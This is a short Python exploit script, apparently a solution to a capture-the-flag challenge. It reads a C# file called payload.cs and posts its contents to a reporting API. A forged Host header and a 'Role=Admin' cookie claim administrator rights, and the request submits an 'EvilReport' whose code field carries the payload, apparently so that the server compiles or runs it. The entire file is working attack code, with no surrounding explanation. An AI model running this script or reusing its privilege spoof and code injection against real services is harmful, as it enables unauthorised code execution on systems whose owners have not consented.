import requests

# Read file
f = open(r"payload.cs", "r")
code = f.read().replace("\\r\\n", "\n")

# Send request
url = "http://io.ept.gg:52137/api/Data"
headers = {
    "Host": "reports.ept.gg:34177",
    "Content-Type": "application/json",
    "Cookie": "Role=Admin"
}
body = {
    "report": "EvilReport",
    "id": "6",
    "name": "EvilReport",
    "code": code
}

response = requests.post(url, json=body, headers=headers)
print(response.status_code)